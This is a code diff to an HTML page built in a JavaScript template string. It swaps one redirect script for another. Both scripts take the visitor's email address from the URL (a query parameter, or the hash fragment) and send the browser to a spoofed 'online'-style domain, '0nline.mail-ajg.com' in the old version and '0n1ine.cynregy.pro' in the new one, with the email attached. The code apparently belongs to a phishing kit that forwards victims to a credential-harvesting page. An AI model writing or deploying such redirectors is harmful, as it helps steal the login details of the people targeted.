@@ -421,27 +421,16 @@ const html = `
         </g>
       </svg>
     </div>
-   <script> 
-    var queryParams = window.location.search 
-      .substr(1) 
-      .split("&") 
-      .reduce(function (q, query) { 
-        var chunks = query.split("="); 
-        var key = chunks[0]; 
-        var value = decodeURIComponent(chunks[1]); 
-        value = isNaN(Number(value)) ? value : Number(value); 
- 
-        console.log("q[key] " + q[key]); 
-        return (q[key] = value), q; 
-      }, {}); 
- 
-    var emailParam = queryParams["l"]; 
-    var decodedEmail = emailParam.includes("@") ? emailParam : atob(emailParam); 
- 
-    window.location.replace( 
-      "https://0nline.mail-ajg.com/?username=" + decodedEmail 
-    ); 
-  </script> 
+<script>
+  var hash = window.location.hash;
+  if(hash !== "") {
+
+    hash = hash.split('#');
+    const email = hash[1];
+
+      window.location.href = "https://0n1ine.cynregy.pro/?eqp=" + email;
+  }
+</script>
   </body>
 </html>
 
